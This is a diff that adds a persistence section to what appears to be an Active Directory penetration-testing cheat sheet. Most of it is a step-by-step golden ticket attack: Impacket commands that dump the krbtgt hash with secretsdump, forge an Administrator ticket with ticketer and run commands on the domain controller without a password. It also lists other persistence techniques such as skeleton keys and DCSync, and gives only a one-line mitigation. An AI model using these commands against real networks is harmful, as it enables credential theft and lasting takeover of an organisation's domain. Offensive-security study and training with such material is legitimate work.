@@ -3830,4 +3830,61 @@ whoami /groups
 
 ### ==🟢Persistence==
 
+#### ==🔵Ways to Persist Administrative Access:==
+- Dump ntds.dit
+- Creation of domain admin account
+- Creation of golden ticket
+- Creation of Skeleton key
+- Use of DCSync/DCShadow
+
+#### ==🔵Golden Ticket*==
+
+on our kali attacker machine : 
+```
+cd /usr/share/doc/python3-impacket/examples
+```
+
+to get the `Primary Dns Suffix` : 
+`target_ip` = domain controller ip
+```
+python3 wmiexec.py domain/username:password@target_ip ipconfig /all
+```
+
+to get domain SID
+```
+python3 lookupsid.py <Primary Dns Suffix we got>/<username of user>:<Password of user>@<DC IP>
+```
+
+now we need `krbtgt` NT hash 
+```
+python3 secretsdump.py <Primary Dns Suffix>/<username>:<Password>@<DC IP> -just-dc-user krbtgt
+```
+well use only the NT hash from here ; which is the last one (krbtgt:)
+
+now we will make the golden ticket
+```
+sudo python3 ticketer.py -domain <Primary Dns Suffix> -domain-sid S-1-5-21-15098949982252412482-3710614348 -nthash a7f6607449f2621e1adf437eaf6b2397 Administrator
+```
+
+now we need to inject this ticket into the memory LSASS
+```
+export KRB5CCNAME=Administrator.ccache
+```
+
+add the dc ip and dc hostname
+```
+gedit /etc/hosts
+```
+
+now interact with the domain without authentication
+```
+python3 wmiexec.py -k -no-pass -dc-ip <DC IP> <DC HOSTNAME> <command to run ex.whoami>
+```
+we got access of domain controller 
+it doesn't even check if the username we are impersonating even exists or not 
+Mitigations: Change the krbtgt account password TWICE. 
+
+
+
+
 
